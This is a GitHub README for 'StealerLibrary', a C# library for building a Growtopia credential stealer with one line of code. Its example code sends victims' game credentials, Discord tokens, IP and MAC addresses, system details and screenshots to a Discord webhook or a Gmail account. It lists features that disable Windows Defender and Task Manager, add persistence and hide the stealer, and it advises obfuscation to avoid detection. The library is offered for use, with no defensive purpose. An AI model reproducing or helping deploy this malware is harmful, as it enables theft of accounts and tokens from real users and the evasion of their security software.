# StealerLibrary
Growtopia (Save.dat) Stealer Library that let you to write a stealer with 1 line of code.
#### ⭐ If you like the project, feel free to star the project ⭐

## Compiled Version: [All Releases](https://github.com/extatent/StealerLibrary/releases/)

### Compile the source code with Visual Studio and add the .DLL to the references in your project and start writting the code below.

#### Your program might be FUD, but the .DLL isn't. Use obfuscator for that.

## Example Usage : 

```csharp
using StealerLibrary;

namespace Example
{
    class Program
    {
        private static void Main()
        {
            //Discord Webhook Method
            Library.DiscordWebhookUrl = "https://discord.com/api/webhooks/example/example";
            Library.WebhookName = "StealerLibrary"; //Optional
            Library.WebhookProfilePictureUrl = ""; //Optional
            
            //Last World, MAC Address, IP Address, Discord Token, User Name, Machine Name, OS Information, Country, Desktop Screenshot
            Library.DiscordStealer(true, true, true, true, true, true, true, true, true);
            
            //Gmail Method
            Library.Gmail = "example@gmail.com";
            Library.GmailPassword = "Example12345.";
            Library.SMTPServer = "smtp.gmail.com"; //Default
            Library.SMTPPort = 587; //Default
            
            //Last World, MAC Address, IP Address, Discord Token, User Name, Machine Name, OS Information, Country, Desktop Screenshot
            Library.GmailStealer(true, true, true, true, true, true, true, true, true);
            
            //Run On Startup, Disable Task Manager, Corrupt Growtopia, Hide Stealer, Disable Windows Defender
            Library.Functions(true, false, true, false, false);
            
            //Trace Save.dat for Discord/Gmail
            Library.TraceSaveDat(true, false);
        }
    }
}
```

## Features
### V1
- GrowID
- Password
- Last World (Customizable: True/False)
- MAC Address (Customizable: True/False)
- IP Address (Customizable: True/False)
### V2
- Discord Token (Customizable: True/False)
- User Name (Customizable: True/False)
- Machine Name (Customizable: True/False)
- OS Information (Customizable: True/False)
- Country (Customizable: True/False)
- Desktop Screenshot (Customizable: True/False)
### V3
- Gmail Method (Optional)
- Trace Save.dat (Customizable: True/False)
- Run On Startup (Customizable: True/False)
- Disable Task Manager (Customizable: True/False)
- Corrupt Growtopia (Customizable: True/False)
- Hide Stealer (Customizable: True/False)
- Disable Windows Defender (Customizable: True/False)

<img src="http://anarchy.5v.pl/example2.png" alt="png">

## StealerLibrary is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/StealerLibrary/blob/main/LICENSE) file for details.
